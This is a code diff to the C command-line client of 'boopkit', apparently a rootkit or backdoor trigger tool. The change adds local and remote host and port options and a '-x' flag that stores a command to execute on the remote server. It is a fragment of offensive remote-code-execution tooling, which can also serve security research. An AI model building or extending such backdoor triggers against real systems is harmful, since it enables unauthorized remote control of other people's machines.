@@ -84,8 +84,12 @@ void usage() {
   printf("Usage: boopkit-boop [options]\n");
   printf("\n");
   printf("Options:\n");
-//  printf("-h, help           Display help and usage for boopkit.\n");
-//  printf("-x, ignore         Source addresses to reject triggers from.\n");
+  printf("-lhost             Local  (src) address: 127.0.0.1.\n");
+  printf("-lport             Local  (src) port:    3535\n");
+  printf("-rhost             Remote (dst) address: 127.0.0.1.\n");
+  printf("-rport             Remote (dst) port:    22\n");
+  printf("-x, execute        Command to execute on the remote server.\n");
+  printf("-h, help           Display help and usage for boopkit.\n");
   printf("\n");
   exit(0);
 }
@@ -121,6 +125,9 @@ void clisetup(int argc, char **argv) {
       switch (argv[i][1]) {
       case 'h':
         usage();
+        break;
+      case 'x':
+        strncpy(cfg.rce, argv[i + 1], MAX_RCE_SIZE);
         break;
       }
     }
